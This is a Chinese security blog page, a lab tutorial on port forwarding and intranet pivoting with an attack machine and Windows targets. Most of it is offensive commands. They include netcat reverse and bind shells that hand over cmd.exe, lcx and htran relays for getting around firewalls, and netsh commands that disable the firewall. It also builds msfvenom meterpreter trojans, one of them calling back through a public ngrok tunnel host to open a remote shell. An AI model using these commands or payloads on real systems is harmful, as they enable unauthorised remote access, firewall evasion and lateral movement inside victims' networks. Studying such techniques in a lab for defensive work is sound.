@@ -1,0 +1,700 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" type="image/png" href="/img/head.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="SE_Null">
+  <meta name="keywords" content="">
+  <title>端口转发 - SE_Null</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-06 16:24" pubdate>
+        October 6, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">端口转发</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>本文介绍一些端口转发的常用工具</p>
+<a id="more"></a>
+<p>攻击机：kali  192.168.43.30</p>
+<p>客户机：win7 192.168.43.78</p>
+<p>客户机1：win2k8 192.168.43.127</p>
+<p>反向连接：此时外网无法访问内网，内网可以访问外网，就让内网机器主动连接外网攻击机</p>
+<p>正向连接：此时内网无法访问外网，外网可以访问内网，此方式流量比较大，但是防火墙需关闭</p>
+<h2 id="1-nc"><a href="#1-nc" class="headerlink" title="1.nc"></a>1.nc</h2><h3 id="1-反向连接"><a href="#1-反向连接" class="headerlink" title="1.反向连接"></a>1.反向连接</h3><p>攻击机监听本地端口：<code>nc -lnvp lport</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129213508026.png" srcset="/img/loading.gif" alt="image-20210129213508026"></p>
+<p>客户机反向连接攻击机：<code>nc.exe -e cmd rhost rport</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215518607.png" srcset="/img/loading.gif" alt="image-20210129215518607"></p>
+<p>攻击机获得客户机的cmdshell</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215531327.png" srcset="/img/loading.gif" alt="image-20210129215531327"></p>
+<h3 id="2-正向连接"><a href="#2-正向连接" class="headerlink" title="2.正向连接"></a>2.正向连接</h3><p>客户机开启监听：<code>nc.exe -l -p lport -e cmd.exe</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215811482.png" srcset="/img/loading.gif" alt="image-20210129215811482"></p>
+<p>攻击机主动连接客户机：<code>nc -nvv rhost rport</code>即可获得客户机的cmdshell</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129215749829.png" srcset="/img/loading.gif" alt="image-20210129215749829"></p>
+<h2 id="2-lcx"><a href="#2-lcx" class="headerlink" title="2.lcx"></a>2.lcx</h2><h3 id="1-反向连接-1"><a href="#1-反向连接-1" class="headerlink" title="1.反向连接"></a>1.反向连接</h3><p>客户机把本地端口转发到远程端口：<code> lcx.exe -slave rhost rport lhost lport</code>（连接3389，需要开启此端口）</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129224151267.png" srcset="/img/loading.gif" alt="image-20210129224151267"></p>
+<p>攻击机用portmap（相当于Linux的lcx）将本地的端口转发至另外一个端口 ：<code>portmap -m 2 -p1 port -p2 port</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129221530534.png" srcset="/img/loading.gif" alt="image-20210129221530534"></p>
+<p>此时攻击机连接本地的5555端口（第一次连接时可能会确认）</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129224302638.png" srcset="/img/loading.gif" alt="image-20210129224302638"></p>
+<p>但是会把客户机挤掉线。。。</p>
+<h3 id="2-正向连接-1"><a href="#2-正向连接-1" class="headerlink" title="2.正向连接"></a>2.正向连接</h3><p>可以访问外网的内网客户机将端口转发到另一台无法访问外网的内网客户机1的端口上：<code>lcx.exe -tran lport rhost rport</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129233221324.png" srcset="/img/loading.gif" alt="image-20210129233221324"></p>
+<p>攻击机连接访问外网的内网客户机的端口（此时就连接上了客户机1）</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129233406109.png" srcset="/img/loading.gif" alt="image-20210129233406109"></p>
+<h3 id="3-绕过防火墙"><a href="#3-绕过防火墙" class="headerlink" title="3.绕过防火墙"></a>3.绕过防火墙</h3><p>客户机将防火前监视的端口转发到防火墙监控不严的端口：<code>lcx.exe -tran 监控不严的窗口 lhost 监控严格的窗口</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129233956914.png" srcset="/img/loading.gif" alt="image-20210129233956914"></p>
+<p>此时攻击机连接客户机</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210129234042891.png" srcset="/img/loading.gif" alt="image-20210129234042891"></p>
+<h2 id="3-netsh"><a href="#3-netsh" class="headerlink" title="3.netsh"></a>3.netsh</h2><p>Windows自带的防火墙规则配置工具。不同的操作系统版本中规则不一样。大概可以用来将本机端口转发至本机或者其他机器。</p>
+<p><code>netsh firewall show state</code> 查看系统防火墙状态</p>
+<p><code>netsh firewall set opmode disable</code> 关闭防火墙</p>
+<p><code>netsh firewall set opmode enable</code> 开启防火墙</p>
+<p>添加转发规则：<code>netsh interface portproxy add v4tov4 listenport=本地TCP端口 listenaddress=本地IP connectport=将传入连接重定向到本地或远程的端口 connectaddress=将传入连接重定向到本地或远程IP地址（或DNS名称）</code></p>
+<p>查看转发规则：<code>netsh interface portproxy dump</code></p>
+<p>显示系统中的转发规则列表：<code>netsh interface portproxy show all</code></p>
+<p>删除转发规则：<code>netsh interface portproxy delete v4tov4 listenport=本机端口  listenaddress=本地ip</code></p>
+<p>清除所有当前的端口转发规则：<code>netsh interface portproxy reset</code></p>
+<h2 id="4-htran"><a href="#4-htran" class="headerlink" title="4.htran"></a>4.htran</h2><h3 id="1-绕过防火墙"><a href="#1-绕过防火墙" class="headerlink" title="1.绕过防火墙"></a>1.绕过防火墙</h3><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1.正向连接"></a>1.正向连接</h4><p>客户机执行<code>htran.exe -p -tran 允许出网的端口(dns:53 http:80) 127.0.0.1 被禁出网的端口</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130005546295.png" srcset="/img/loading.gif" alt="image-20210130005546295"></p>
+<p>攻击机监听即可</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130005611826.png" srcset="/img/loading.gif" alt="image-20210130005611826"></p>
+<h4 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2.反向连接"></a>2.反向连接</h4><p>客户机将本地的端口转发到攻击机端口<code>htran.exe -p -slave rhost rport 127.0.0.1 lport </code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130010234940.png" srcset="/img/loading.gif" alt="image-20210130010234940"></p>
+<p>攻击机利用portmap进行转发</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130010211109.png" srcset="/img/loading.gif" alt="image-20210130010211109"></p>
+<p>攻击机监听即可</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130010137130.png" srcset="/img/loading.gif" alt="image-20210130010137130"></p>
+<h3 id="2-转发内网端口"><a href="#2-转发内网端口" class="headerlink" title="2.转发内网端口"></a>2.转发内网端口</h3><p>1.将客户机转发到本地<code>Htran.exe -p -tran lport1 lhost lport2</code>    </p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130011414066.png" srcset="/img/loading.gif" alt="image-20210130011414066"></p>
+<p>攻击机监听客户机即可</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130011451711.png" srcset="/img/loading.gif" alt="image-20210130011451711"></p>
+<p>2.此方法内网中被攻击的主机均需具有此工具</p>
+<p>客户机监听本地端口（相当于将端口1转发至端口2） <code>htran.exe -p listen lport1 lport2</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130011956041.png" srcset="/img/loading.gif" alt="image-20210130011956041"></p>
+<p>客户机1将本地的端口转发至客户机的端口1:<code> htran.exe -p -slave host1 port1 127.0.0.1 lport</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130012149883.png" srcset="/img/loading.gif" alt="image-20210130012149883"></p>
+<p>攻击机监听客户机的端口2即可（最后链接的是客户机1）<code>rdesktop 192.168.43.78：9999 </code></p>
+<p>不知道什么原因，本地没有复现出来、。。。</p>
+<h2 id="5-socat"><a href="#5-socat" class="headerlink" title="5.socat"></a>5.socat</h2><p>使用TCP4监听客户机本地端口，将客户机1的端口转发到本地：<code>socat.exe TCP4-LISTEN:lport,reuseaddr,fork TCP4:rhost:rport</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014200104.png" srcset="/img/loading.gif" alt="image-20210130014200104"></p>
+<p>攻击机监听客户机即可（最后是监听的客户机1）</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014306327.png" srcset="/img/loading.gif" alt="image-20210130014306327"></p>
+<h2 id="6-fpipe"><a href="#6-fpipe" class="headerlink" title="6.fpipe"></a>6.fpipe</h2><p>将客户机1转发到客户机:<code>Fpipe.exe -l lport -r rport rhost -v （v:显示过程）</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014516518.png" srcset="/img/loading.gif" alt="image-20210130014516518"></p>
+<p>攻击机连接客户机即可（最后链接的是客户机2）</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130014555714.png" srcset="/img/loading.gif" alt="image-20210130014555714"></p>
+<h2 id="7-portfwd"><a href="#7-portfwd" class="headerlink" title="7.portfwd"></a>7.portfwd</h2><p> msf生成一个木马放入客户机进行执行:</p>
+<pre><code class="hljs angelscript">msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.30</span> lport=<span class="hljs-number">3333</span> -f exe &gt; bug.exe</code></pre>
+
+<p>攻击机开启监听.</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130015102500.png" srcset="/img/loading.gif" alt="image-20210130015102500"></p>
+<p>将客户机1转发到本地（此时本地是客户机：<code>portfwd add -l port -r rhost -p rport</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130015238123.png" srcset="/img/loading.gif" alt="image-20210130015238123"></p>
+<p>查看转发规则：<code>portfwd list</code></p>
+<p>监听客户机即可（最后链接的是客户机1）</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130015600557.png" srcset="/img/loading.gif" alt="image-20210130015600557"></p>
+<h2 id="8-cs"><a href="#8-cs" class="headerlink" title="8.cs"></a>8.cs</h2><p>使用cs生成一个木马并放置客户机运行，成功上线，然后后msf一样在交互区输入：<code>port lport rhost rport</code></p>
+<p>停止转发：<code>rprtfwd stop 8888</code></p>
+<h2 id="9-rinetd（linux自带文件-etc-rinetd-conf）"><a href="#9-rinetd（linux自带文件-etc-rinetd-conf）" class="headerlink" title="9.rinetd（linux自带文件 /etc/rinetd.conf）"></a>9.rinetd（linux自带文件 /etc/rinetd.conf）</h2><p><a target="_blank" rel="noopener" href="https://github.com/boutell/rinetd">https://github.com/boutell/rinetd</a></p>
+<p>按如下格式编辑此文件，将远程客户机转发到本地攻击机：<code>0.0.0.0 lport rhost rport</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130020222684.png" srcset="/img/loading.gif" alt="image-20210130020222684"></p>
+<p>启动rinetd：<code>rinetd</code></p>
+<p>监听本机即可（最后连接的是客户机）</p>
+<p>我失败了，没转发出来，，，法克</p>
+<h2 id="10-rtcp"><a href="#10-rtcp" class="headerlink" title="10.rtcp"></a>10.rtcp</h2><p>需要python环境。github项目地址：<a target="_blank" rel="noopener" href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a></p>
+<p>在客户机运行：<code>./rtcp.py c:localhost:port c:rhost:port1</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130210249919.png" srcset="/img/loading.gif" alt="image-20210130210249919"></p>
+<p>攻击机将端口1转发至端口2：<code>./rtcp.py l:port1 l:port2</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130210326260.png" srcset="/img/loading.gif" alt="image-20210130210326260"></p>
+<p>如果客户机是linux，可以转发时将22端口转发出来，然后ssh连接本地端口2：<code>ssh -p lhost port2</code></p>
+<p>但是此次客户机是Windows，则转发3389，连接本地的端口2</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130210444890.png" srcset="/img/loading.gif" alt="image-20210130210444890"></p>
+<h2 id="11-ngrock"><a href="#11-ngrock" class="headerlink" title="11.ngrock"></a>11.ngrock</h2><p>官网：<a target="_blank" rel="noopener" href="https://www.ngrok.cc/login.html">https://www.ngrok.cc/login.html</a></p>
+<p>一款在线的内网穿透工具，本例以msf+ngrok</p>
+<p>首先隧道管理-开通隧道-滑倒最后选择免费的服务器，然后简单设置一下</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130024649750.png" srcset="/img/loading.gif" alt="image-20210130024649750"></p>
+<p>注意：本地端口那里ip和端口选择kali的ip和端口</p>
+<p>点击确定后成功开通</p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130024913633.png" srcset="/img/loading.gif" alt="image-20210130024913633"></p>
+<p>将客户端下载到kali，启动：<code>./sunny clientid 隧道id</code></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130025255206.png" srcset="/img/loading.gif" alt="image-20210130025255206"></p>
+<p><img src="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20210130025331893.png" srcset="/img/loading.gif" alt="image-20210130025331893"></p>
+<p>然后msf制作木马</p>
+<pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp  <span class="hljs-attribute">LHOST</span>=free.idcfengye.com <span class="hljs-attribute">LPORT</span>=远程端口 -f exe -o shell.exe</code></pre>
+
+<p>然后开启监听</p>
+<pre><code class="hljs awk">use exploit<span class="hljs-regexp">/multi/</span>handler  
+
+set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp  
+
+set lhost <span class="hljs-number">192.168</span>.<span class="hljs-number">43.30</span>  <span class="hljs-regexp">//</span>这个就是你刚刚网站的填写的IP
+
+set lport <span class="hljs-number">3333</span>  <span class="hljs-regexp">//</span>这个就是刚刚IP后面跟着的端口
+
+exploit</code></pre>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/lcx/">lcx</a>
+                    
+                      <a class="hover-with-bg" href="/tags/netsh/">netsh</a>
+                    
+                      <a class="hover-with-bg" href="/tags/htran/">htran</a>
+                    
+                      <a class="hover-with-bg" href="/tags/socat/">socat</a>
+                    
+                      <a class="hover-with-bg" href="/tags/fpipe/">fpipe</a>
+                    
+                      <a class="hover-with-bg" href="/tags/portfwd/">portfwd</a>
+                    
+                      <a class="hover-with-bg" href="/tags/cs/">cs</a>
+                    
+                      <a class="hover-with-bg" href="/tags/rinetd/">rinetd</a>
+                    
+                      <a class="hover-with-bg" href="/tags/rtcp/">rtcp</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ngrock/">ngrock</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">网络代理</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/">
+                        <span class="hidden-mobile">免杀文档制作</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <!-- <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div> -->
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "端口转发&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 100,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
